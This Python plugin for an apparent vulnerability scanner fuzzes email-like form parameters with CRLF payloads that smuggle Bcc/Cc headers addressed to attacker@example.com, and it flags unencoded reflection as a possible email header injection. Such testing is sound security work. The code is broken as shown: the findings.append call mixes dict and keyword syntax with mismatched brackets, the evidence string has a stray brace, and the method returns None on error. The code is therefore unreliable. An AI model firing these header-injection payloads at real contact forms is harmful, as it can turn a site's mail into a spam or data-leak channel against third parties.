from sdk.base_plugin import BasePlugin

class EmailInjectionPlugin(BasePlugin):
    """
    Checks for Email Header Injection in contact forms/email triggers.
    Injects CRLF sequences to add 'Cc' or 'Bcc' headers.
    """
    name = "Email Header Injection"

    # Injection payloads
    PAYLOADS = [
        "test@example.com\r\nBcc: attacker@example.com",
        "test@example.com%0ABcc:attacker@example.com",
        "test@example.com\nCc:attacker@example.com"
    ]

    def should_run(self, endpoint):
        # Target parameters that look like email inputs
        return any(p['name'].lower() in ['email', 'mail', 'to', 'from', 'cc', 'contact'] for p in endpoint.params)

    def detect(self, http, endpoint, payload_intel):


        findings = []
        try:
            base_params = {p['name']: p['value'] for p in endpoint.params}
        except: return

        for param in endpoint.params:
            if not any(x in param['name'].lower() for x in ['email', 'mail', 'to', 'from']):
                continue

            for payload in self.PAYLOADS:
                fuzzed = base_params.copy()
                fuzzed[param['name']] = payload
                
                try:
                    resp = http.request(endpoint.method, endpoint.url, data=fuzzed if endpoint.method == "POST" else None, params=fuzzed if endpoint.method == "GET" else None)
                    if not resp: continue
                    
                    # Detection: Hard to confirm without mailbox access (OAST),
                    # but we check if the CRLF is reflected unencoded in the response 
                    # (indicating poor sanitization).
                    if "\nBcc:" in resp.text or "\nCc:" in resp.text:
                         findings.append({'plugin': self.name, 'endpoint': endpoint.url, 'parameter': param['name'], 'payload': payload, 'evidence': "CRLF injection reflected in response (Possible Email Injection})",
                            confidence="MEDIUM"
                        )
                except: continue
        return findings